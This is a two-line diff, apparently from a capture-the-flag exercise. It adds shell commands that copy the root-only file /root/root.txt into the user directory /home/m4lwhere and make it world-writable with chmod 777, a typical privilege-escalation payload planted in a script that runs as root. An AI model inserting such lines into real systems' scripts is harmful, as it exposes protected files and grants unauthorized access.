@@ -1,0 +1,2 @@
+cp /root/root.txt /home/m4lwhere/
+chmod 777 /home/m4lwhere/root.txt
